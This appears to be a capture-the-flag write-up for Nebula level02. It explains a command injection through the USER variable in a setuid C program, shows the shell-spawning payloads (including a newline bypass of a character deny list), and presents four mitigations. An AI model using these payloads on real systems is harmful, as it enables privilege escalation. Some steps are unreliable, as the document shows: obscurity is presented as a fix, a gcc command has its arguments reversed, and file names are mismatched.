# Level 02
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the **level02** account with the password **level02**. Files for this level can be found in /home/flag02.

## Source Code

```c++
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```
## Writeup

The problem in this code is run **/bin/echo** with a environment variable **USER** without checking his content.
We can put a string inside with **;** character and the **/bin/bash** command with a comment at the end to comment the other code.

```bash
USER='ciao;/bin/bash # ' /home/flag02/flag02
```

We have now a bash with **flag02** account. We can check it with **id** command:

```bash
flag02@nebula:/home/flag02$ id
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
```

Now we can run `getflag` command:

```bash
flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```

## Mitigation #1

Delete the debug message to make the injection more difficult to detect:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  
  system(buffer);
}
```

Save the script to **level02-nodebug.c** and compile it:

```bash
gcc -o /home/flag02/level02-nodebug.c /home/flag02/level02-nodebug
```

Change owner and permission:

```bash
chown flag02:level02 /home/flag02/flag02-nodebug
chmod 4750 /home/flag02/flag02-nodebug
```

Try again the exploit:

```bash
USER='ciao;/bin/bash # ' /home/flag02/flag02
```

With this output:

```bash
ciao
flag02@nebula:/home/flag02$
```

The script is still vulnerable but more difficult to understand without the code.

## Mitigation #2

The binary use the environment variable **USER** but is not checked before calling the system function **system()**.

We can use a **White/Allow list** by using the function **getpwuid(getuid())**.

The code will be:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

#include <pwd.h>    /* include the library */

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  struct passwd *passwd;  /* define a struct passwd */

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  passwd = getpwuid(getuid());    /* get the record of /etc/passwd of the user */

  if (passwd == NULL)     /* check if we have got the record or not */
  {
    perror("getpwuid()");
    exit(EXIT_FAILURE);
  }

  asprintf(&buffer, "/bin/echo %s is cool", passwd->pw_name);   /* use the name of /etc/passwd */
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

Save the code as **flag02-getpwuid.c** and compile it:

```bash
gcc -o /home/flag02/flag02-getpwuid /home/flag02/flag02-getpwuid.c
```

Set correct privileges:

```bash
chown flag02:level02 /home/flag02/flag02-getpwuid
chmod 4750 /home/flag02/flag02-getpwuid
```

We can try again the exploit and this is the result:

```bash
level02@nebula:/home/flag02$ USER='ciao;/bin/bash # ' /home/flag02/flag02-getpwuid
about to call system("/bin/echo flag02 is cool")
flag02 is cool
level02@nebula:/home/flag02$
```

## Mitigation #3

We can **sanitize** the **USER** environment variable also using the UNIX standard rules for username.

This is a **Black/Deny list** approach.

We can **sanitize** the environment variable **USER** with:

- **Filter**: remove all characters that in BASH will execute arbitrary commands.
- **Validation**: check if the username do not start with **-** or **_** or **\***.

The code will be:

```c++
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  const char invalid_chars[] = "!\"$&'()*,:;<=>?@[\\]^`{|}";    /* create a list of deny chars */

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  
  if ((strpbrk(buffer, invalid_chars)) != NULL)   /* sanitizing */
  {
    perror("strpbrk");
    exit(EXIT_FAILURE);
  }

  if (getenv("USER")[0] == '-' || getenv("USER")[0] == '_')   /* validating */
  {
    printf("Invalid username.\n");
    exit(EXIT_FAILURE);
  }
  
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

Save this code as **flag02-strpbrk.c** and compile it:

```bash
gcc -o /home/flag02/flag02-strpbrk /home/flag02/flag02-strpbrk.c
```

Set correct owner and privileges:

```bash
chown flag02:level02 /home/flag02/flag02-strpbrk
chmod 4750 /home/flag02/flag02-strpbrk
```

If we try again the exploit, this will be the output:

```bash
level02@nebula:/home/flag02$ USER='ciao;/bin/bash # ' /home/flag02/flag02-strpbrk
strpbrk: Success
level02@nebula:/home/flag02$
```

But the **Black/Deny list** approach can leave some working exploit.

For example we can exploit this mitigation in this way:

```bash
USER='
/bin/bash # ' /home/flag02/flag02-strpbrk
```

We can use the **return line** code as a **command separator** to avoid mitigation.

This will be the output:

```bash
level02@nebula:/home/flag02$ USER='
> /bin/bash # ' /home/flag02/flag02-strpbrk
about to call system("/bin/echo 
/bin/bash #  is cool")

flag02@nebula:/home/flag02$
```

## Mitigation #4

Another mitigation can be use the **White/Allow list** approach to the input.

We can suppose valid an username with these characters:

- Alfanumeric characters as: **0-9**, **a-z**, **A-Z** 
- Also characters **-** and **_**

The code will be:

```c++
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

#include <ctype.h>    /* include the library */

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  char *p;    /* define a char pointer */

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  
  p = getenv("USER");   /* point to USER environment variable */
  
  while (*p != 0)   /* check every chars in the USER environment variable */
  {
    if (isalnum(*p) || *p == '-' || *p == '_')
      p++;
    else
    {
      printf("Invalid username. \n");
      exit(EXIT_FAILURE);
    }
  }

  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

Save the code as **flag02-isalnum.c** and compile it:

```bash
gcc -o /home/flag02/flag02-isalnum /home/flag02/flag02-isalnum.c
```

Set correct owner and privileges:

```bash
chown flag02:level02 /home/flag02/flag02-isalnum
chmod 4750 /home/flag02/flag02-isalnum
```

If we try again the exploit, this will be the output:

```bash
level02@nebula:/home/flag02$ USER='ciao;/bin/bash # ' /home/flag02/flag02-isalnum
Invalid username. 
level02@nebula:/home/flag02$
```

If we try the second exploit, this will be the output:

```bash
level02@nebula:/home/flag02$ USER='
> /bin/bash # ' /home/flag02/flag02-isalnum
Invalid username. 
level02@nebula:/home/flag02$
```